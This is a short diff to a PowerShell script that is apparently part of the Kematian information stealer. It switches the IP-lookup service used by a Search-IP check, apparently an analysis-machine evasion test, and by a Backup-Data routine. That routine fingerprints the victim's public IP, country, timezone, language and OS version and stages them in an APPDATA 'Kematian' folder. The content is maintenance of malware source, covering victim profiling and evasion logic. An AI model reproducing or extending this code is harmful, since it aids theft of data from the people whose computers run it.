@@ -91,7 +91,7 @@ function Search-Mac ($mac_addresses) {
 }
 
 function Search-IP ($ip_addresses) {
-    $pc_ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
+    $pc_ip = Invoke-WebRequest -Uri "https://ipapi.co/ip" -UseBasicParsing
     $pc_ip = $pc_ip.Content
     return $ip_addresses -contains $pc_ip
 }
@@ -242,7 +242,7 @@ function Backup-Data {
     $offsetHours = $timezone.BaseUtcOffset.Hours
     $timezoneString = "UTC$offsetHours"
     $filedate = Get-Date -Format "yyyy-MM-dd"
-    $countryCode = (Invoke-WebRequest -Uri "https://ipapi.co/$ip/country_code" -UseBasicParsing).Content
+    $countryCode = (Invoke-WebRequest -Uri "https://ipapi.co/country_code" -UseBasicParsing).Content
     $folderformat = "$env:APPDATA\Kematian\$countryCode-($uuid)-($filedate)-($timezoneString)"
 
     $folder_general = $folderformat
@@ -261,7 +261,7 @@ function Backup-Data {
     }
 
     #bulk data (added build ID with banner)
-    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org")
+    $ip = (Invoke-WebRequest -Uri "https://ipapi.co/ip").Content
     $lang = (Get-WinUserLanguageList).LocalizedName
     $date = Get-Date -Format "r"
     $osversion = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
